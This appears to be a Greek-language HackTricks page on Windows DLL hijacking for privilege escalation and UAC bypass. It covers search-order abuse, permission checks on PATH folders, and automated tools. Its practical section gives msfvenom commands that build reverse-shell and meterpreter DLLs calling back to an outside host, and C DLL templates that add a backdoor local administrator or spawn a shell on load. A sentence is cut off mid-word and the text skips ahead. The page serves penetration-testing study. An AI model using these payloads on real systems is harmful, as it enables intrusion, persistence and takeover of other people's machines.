# Dll Hijacking

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Εάν ενδιαφέρεστε για μια **καριέρα στο χάκινγκ** και να χακεύετε το αχακέβατο - **προσλαμβάνουμε!** (_απαιτείται άπταιστη γραπτή και προφορική γνώση της πολωνικής_).

{% embed url="https://www.stmcyber.com/careers" %}

## Βασικές Πληροφορίες

Η DLL Hijacking περιλαμβάνει την παραπλάνηση μιας αξιόπιστης εφαρμογής ώστε να φορτώσει μια κακόβουλη DLL. Αυτός ο όρος περιλαμβάνει αρκετές τακτικές όπως **DLL Spoofing, Injection και Side-Loading**. Χρησιμοποιείται κυρίως για την εκτέλεση κώδικα, την επίτευξη μόνιμης παρουσίας και, σπανιότερα, την ανέλιξη δικαιωμάτων. Παρά την έμφαση στην ανέλιξη εδώ, η μέθοδος της παραπλάνησης παραμένει συνεπής ανεξάρτητα από τους στόχους.

### Κοινές Τεχνικές

Χρησιμοποιούνται αρκετές μέθοδοι για την παραπλάνηση DLL, με την αποτελεσματικότητά τους να εξαρτάται από τη στρατηγική φόρτωσης DLL της εφαρμογής:

1. **Αντικατάσταση DLL**: Αντικατάσταση μιας γνήσιας DLL με μια κακόβουλη, προαιρετικά χρησιμοποιώντας το DLL Proxying για να διατηρηθεί η λειτουργικότητα της αρχικής DLL.
2. **Παραπλάνηση Τάξης Αναζήτησης DLL**: Τοποθέτηση της κακόβουλης DLL σε ένα μονοπάτι αναζήτησης πριν από τη γνήσια, εκμεταλλευόμενη το μοτίβο αναζήτησης της εφαρμογής.
3. **Παραπλάνηση Φανταστικής DLL**: Δημιουργία μιας κακόβουλης DLL για να φορτωθεί από μια εφαρμογή, πιστεύοντας ότι είναι μια μη υπαρκτή απαιτούμενη DLL.
4. **Ανακατεύθυνση DLL**: Τροποποίηση παραμέτρων αναζήτησης όπως `%PATH%` ή αρχεία `.exe.manifest` / `.exe.local` για να κατευθύνει την εφαρμογή στην κακόβουλη DLL.
5. **Αντικατάσταση DLL WinSxS**: Αντικατάσταση της γνήσιας DLL με μια κακόβουλη αντίστοιχη στον κατάλογο WinSxS, μια μέθοδος συχνά συνδεδεμένη με την παραπλάνηση πλευρικής φόρτωσης DLL.
6. **Παραπλάνηση DLL με Σχετική Διαδρομή**: Τοποθέτηση της κακόβουλης DLL σε έναν κατάλογο που ελέγχεται από τον χρήστη με την αντιγραμμένη εφαρμογή, μοιάζοντας με τεχνικές Εκτέλεσης Δυαδικού Προξενού.

## Εύρεση λείπουσων DLLs

Ο πιο κοινός τρόπος για να βρείτε λείπουσες DLLs μέσα σε έν
#### Εξαιρέσεις στην ταξινόμηση της αναζήτησης DLL σύμφωνα με τα έγγραφα των Windows

Ορισμένες εξαιρέσεις στην κανονική ταξινόμηση αναζήτησης DLL αναφέρονται στα έγγραφα των Windows:

- Όταν συναντάται ένα **DLL που μοιράζεται το όνομά του με ένα ήδη φορτωμένο στη μνήμη**, το σύστημα παρακάμπτει την κανονική αναζήτηση. Αντ' αυτού, πραγματοποιεί έναν έλεγχο για ανακατεύθυνση και έναν προσδιορισμό πριν προεπιλέξει το DLL που ήδη βρίσκεται στη μνήμη. **Σε αυτήν την περίπτωση, το σύστημα δεν πραγματοποιεί αναζήτηση για το DLL**.
- Σε περιπτώσεις όπου το DLL αναγνωρίζεται ως ένα **γνωστό DLL** για την τρέχουσα έκδοση των Windows, το σύστημα θα χρησιμοποιήσει τη δική του έκδοση του γνωστού DLL, μαζί με οποιαδήποτε εξαρτώμενα DLL του, **παρακάμπτοντας τη διαδικασία αναζήτησης**. Το κλειδί του μητρώου **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** περιέχει μια λίστα από αυτά τα γνωστά DLL.
- Αν ένα DLL έχει εξαρτήσεις, η αναζήτηση για αυτά τα εξαρτώμενα DLL πραγματοποιείται ως να ήταν υποδεικνυόμενα μόνο από τα **ονόματα των ενοτήτων** τους, ανεξάρτητα από το αν το αρχικό DLL εντοπίστηκε μέσω πλήρους διαδρομής.

### Ανύψωση Προνομίων

**Απαιτήσεις**:

- Εντοπίστε ένα διεργασία που λειτουργεί ή θα λειτουργήσει με **διαφορετικά προνόμια** (οριζόντια ή πλευρική μετακίνηση), η οποία **λείπει από ένα DLL**.
- Βεβαιωθείτε ότι υπάρχει **δυνατότητα εγγραφής** για οποιοδήποτε **κατάλογο** στον οποίο θα γίνει **αναζήτηση για το DLL**. Αυτή η τοποθεσία μπορεί να είναι ο κατάλογος του εκτελέσιμου αρχείου ή ένας κατάλογος εντός της διαδρομής του συστήματος.

Ναι, οι προϋποθέσεις είναι δύσκολο να βρεθούν καθώς **από προεπιλογή είναι περίεργο να βρεθεί ένα προνομιούχο εκτελέσιμο που λείπει ένα DLL** και είναι ακόμα **πιο περίεργο να έχετε δικαιώματα εγγραφής σε έναν κατάλογο της διαδρομής του συστήματος** (δεν μπορείτε από προεπιλογή). Ωστόσο, σε μη σωστά διαμορφωμένα περιβάλλοντα αυτό είναι δυνατό.\
Στην περίπτωση που έχετε την τύχη και πληροίτε τις απαιτήσεις, μπορείτε να ελέγξετε το έργο [UACME](https://github.com/hfiref0x/UACME). Ακόμα κι αν το **κύριο στόχο του έργου είναι η παράκαμψη του UAC**, μπορείτε να βρείτε εκεί ένα **PoC** για την κλοπή DLL για την έκδοση των Windows που μπορείτε να χρησιμοποιήσετε (πιθανώς αλλάζοντας τη διαδρομή του καταλόγου όπου έχετε δικαιώματα εγγραφής).

Σημειώστε ότι μπορείτε να **ελέγξετε τα δικαιώματά σας σε έναν κατάλογο** κάνοντας:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Και **ελέγξτε τα δικαιώματα όλων των φακέλων μέσα στο PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Μπορείτε επίσης να ελέγξετε τις εισαγωγές ενός εκτελέσιμου αρχείου και τις εξαγωγές ενός dll με:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Για οδηγίες για το πώς να **καταχραστείτε το Dll Hijacking για να αναβαθμίσετε δικαιώματα** με δικαιώματα εγγραφής σε έναν φάκελο **System Path**, ελέγξτε:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Αυτοματοποιημένα εργαλεία

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) θα ελέγξει αν έχετε δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στο σύστημα PATH.\
Άλλα ενδιαφέροντα αυτοματοποιημένα εργαλεία για την ανακάλυψη αυτής της ευπάθειας είναι οι λειτουργίες **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ και _Write-HijackDll._

### Παράδειγμα

Σε περίπτωση που βρείτε ένα ευπάθεια που μπορεί να εκμεταλλευτείτε, ένα από τα πιο σημαντικά πράγματα για να το εκμεταλλευτείτε με επιτυχία θα ήταν να **δημιουργήσετε ένα dll που να εξάγει τουλάχιστον όλες τις λειτουργίες που θα εισάγει το εκτελέσιμο από αυτό**. Παρόλα αυτά, να σημειωθεί ότι το Dll Hijacking είναι χρήσιμο για να [αναβαθμίσετε από το επίπεδο Medium Integrity στο High **(παράκαμψη του UAC)**](../authentication-credentials-uac-and-efs.md#uac) ή από το **High Integrity στο SYSTEM**. Μπορείτε να βρείτε ένα παράδειγμα **πώς να δημιουργήσετε ένα έγκυρο dll** μέσα σε αυτήν τη μελέτη για το dll hijacking για εκτέλεση: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Επιπλέον, στην **επόμενη ενότητα** μπορείτε να βρείτε μερικούς **βασικούς κώδικες dll** που μπορεί να είναι χρήσιμοι ως **πρότυπα** ή για να δημιουργήσετε ένα **dll με μη απαιτούμενες εξαγόμενες λειτουργίες**.

## **Δημιουργία και συγγραφή Dlls**

### **Dll Proxifying**

Βασικά, ένα **Dll proxy** είναι ένα Dll που είναι ικανό να **εκτελέσει το κακόβουλο κώδικά σας όταν φορτώνεται**, αλλά επίσης να **εκθέτει** και να **λειτουργεί** όπως αναμένεται **μεταφέροντας όλες τις κλήσεις στην πραγματική βιβλιοθήκη**.

Με το εργαλείο [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ή [**Spartacus**](https://github.com/Accenture/Spartacus) μπορείτε πραγματικά να **υποδείξετε ένα εκτελέσιμο και να επιλέξετε τη βιβλιοθήκη** που θέλετε να κάνετε proxify και να **δημιουργήσετε ένα proxified dll** ή να **υποδείξετε το Dll** και να **δημιουργήσετε ένα proxified dll**.

### **Meterpreter**

**Λήψη αντίστροφης κελύφους (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Αποκτήστε ένα meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Δημιουργία χρήστη (x86 Δεν είδα μια έκδοση x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Δικό σας

Σημειώστε ότι σε πολλές περιπτώσεις ο Dll που συντάσσετε πρέπει να **εξάγει πολλές συναρτήσεις** που θα φορτωθούν από τη διεργασία θύμα, αν αυτές οι συναρτήσεις δεν υπάρχουν το **δυαδικό αρχείο δεν θα μπορέσει να τις φορτώσει** και η **εκμετάλλευση θα αποτύχει**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Αναφορές
* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Εάν ενδιαφέρεστε για μια **καριέρα στο χάκινγκ** και θέλετε να χακεύετε το αδύνατο - **προσλαμβάνουμε!** (_απαιτείται άριστη γνώση γραπτού και προφορικού Πολωνικών_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
